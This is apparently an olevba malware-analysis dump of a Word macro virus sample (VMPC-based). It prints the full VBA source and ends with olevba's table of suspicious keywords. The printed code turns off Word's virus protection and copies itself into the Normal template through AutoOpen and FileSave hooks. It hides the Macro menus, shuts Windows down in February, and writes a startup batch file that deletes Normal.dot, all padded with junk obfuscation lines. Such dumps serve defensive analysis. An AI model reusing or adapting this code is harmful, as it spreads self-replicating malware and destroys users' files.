olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-0a9adf50cedf70b4896a9cd9c5a8cf332d671f8a4806fd45b0df9d69feb67207
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-0a9adf50cedf70b4896a9cd9c5a8cf332d671f8a4806fd45b0df9d69feb67207 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO hirn.bas 
in file: Virus.MSWord.VMPC-based-0a9adf50cedf70b4896a9cd9c5a8cf332d671f8a4806fd45b0df9d69feb67207 - OLE stream: 'Macros/VBA/hirn'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub hirn()
    
  
On Error Resume Next
JgFy17680 = AuStMsQp & PeSz6923 & HtNwApQe & IsLg16188
MrQh5194 = TyDnAhKx & EuPy4810 & Int(Rnd * 2985)
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
VBE.ActiveVBProject.VBComponents("hirn").Export "c:\hirn.drv"
LwTz6301 = AyGmRuNq & GvRh8395 & Int(Rnd * 7371)
KpLs10408 = GxMoEsCx & MmHe11505 & Int(Rnd * 628)
EmAvAkFe = KhMn8646 & LlPq16534
ActiveDocument.ReadOnlyRecommended = False
DmOo4550 = GkFoLkKu & TeMn7092 & Int(Rnd * 1952)
OtOtVuKz = MpIx8962 & FkAs8231
If Month(Now()) = 2 Then Call LnKr3859KfVx
IsTyFzGo = ArGr7813 & QvBo8414
DiVnErBy = DmHq11498 & FjSm6639
FwJoRnBs = JfQs11081 & IzLl7579
EwLxSyFr = QpDz6393 & JfFp5778
 OxSw7602$ = "c:\windows\startm~1\programs\startup\msfile.bat"
BhOm4435 = HrCzQsQj & VfRm10596 & Int(Rnd * 1713)
GwRe3859624 = GetAttr(NormalTemplate.FullName)
HwEfUoAu = GhDk6247 & GkUq2148
If GwRe3859624 = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(OxSw7602$)
KyKk12351 = PgHgPpHz & ImKw13731 & JsHyRtHo & ClPr18049
If GwRe3859624 = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call vBitchES(OxSw7602$)
BnSkKiPk = EeOk6687 & OxUw15647
OtSt8044 = GuSgVeHm & KkQz15365 & Int(Rnd * 3674)
If GwRe3859624 = vbReadOnly Then GoTo NsHjRlFy
FeUvTpEf = AtLt10475 & HtPu1235
ToEvImBr = RgHh4490 & SjCm13375
If GwRe3859624 = vbReadOnly + vbArchive Then GoTo NsHjRlFy
TjLeDzPr = FrDy12268 & LjMt16664
PrQlVwSv = ErQi17757 & KnLj12540
If NormalTemplate.VBProject.VBComponents.Item("hirn").Name <> "hirn" Then CwTh62485313 = True
HxFw7566 = CfQhSzVz & RfCy10427 & JlJgTeNr & QoRi10362
If ActiveDocument.VBProject.VBComponents.Item("hirn").Name <> "hirn" Then OwUp85315 = True
EmPr10054 = FwJoIoFs & GlFy12541 & Int(Rnd * 7698)
If CwTh62485313 = True And OwUp85315 = False Then Set VoNj85316249 = NormalTemplate.VBProject.VBComponents
If CwTh62485313 = False And OwUp85315 = True Then Set VoNj85316249 = ActiveDocument.VBProject.VBComponents
VoNj85316249.import "c:\hirn.drv"
JhMh3459 = TgKfKgKt & KnMe17316 & Int(Rnd * 900)
JuDm13803 = IkCxDfVy & MjHj1950 & Int(Rnd * 6843)
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
VnKtUySj = JtOr1761 & QvMk2462
AtAp10923 = HpKeBqDs & AjAg3658 & Int(Rnd * 5258)
If OwUp85315 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
HwIq19069 = FpFnUtMg & OnQt14929 & MnQqTpNp & ErKt10273
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
'VMPCK v1.0d [The Final Version?]
NsHjRlFy:
End Sub
Sub FileSave()
    On Error Resume Next
DyNs8831 = DhEzTiIn & GkJs12461 & Int(Rnd * 1067)
    Call hirn
VjTq9700 = FwFoMkHn & AjEw3578 & QpOvOmQq & MrFi15593
CfLf5666 = OkEwTfGg & KkJr10155 & Int(Rnd * 557)
    ActiveDocument.Save
NpUy12136 = BuJoDpKn & RoNz9520 & Int(Rnd * 3017)
End Sub
Sub AutoOpen()
    On Error Resume Next
FyUsMtSe = OyJk17695 & KuMg3609
BoSt4744 = FuNeFuGn & VkUo12869 & Int(Rnd * 9260)
    Call hirn
End Sub
Sub ViewVBCode()
    On Error Resume Next
RrAwHnFo = HjSl9242 & HnEq10658
VtTfCkIp = OjNv14562 & OoDz8465
DhQwSqIy = LwAx5228 & SxRy8518
StLtFxGk = TkBh13988 & JiEm13556
OnOqAiFv = IwHz4822 & EvSo1678
End Sub
Sub LnKr3859KfVx()
    On Error Resume Next
AkGmJeDg = UlKy18496 & KfFw17681
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
    
Sub vBitchES(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
JyUi9567 = QtAoShHv & HjJn13386 & Int(Rnd * 4787)
IhAf10674 = UtDoNuJo & JlKs6972 & Int(Rnd * 859)
Part11$ = "attrib -h -r "
HxPt4782 = DsJqVsVv & QyAp10082 & Int(Rnd * 2431)
KlHz9222 = FpIsDiRq & FnOj8754 & Int(Rnd * 8843)
snag$ = "c:\progra~1\micros~1\templa~1\"
JmDtRzSy = KpMi945 & NwIi10945
snag1$ = "c:\progra~1\micros~2\templa~1\"
AiMp4356 = KjBgKvLr & PiEw1430 & Int(Rnd * 771)
Part2$ = "del "
VoMvCvRy = BhNn9276 & AzFm7317
UhAqJrLf = DkEu7382 & PfHn4524
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + "c:\windows\startm~1\programs\startup\msfile.bat"
Close hFile
VtCl7355 = MiFjCgUj & UuOp10955 & HnNtBzLx & EeKi12049
AgIf10082 = RlUePfHq & RgCq5538 & Int(Rnd * 9417)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

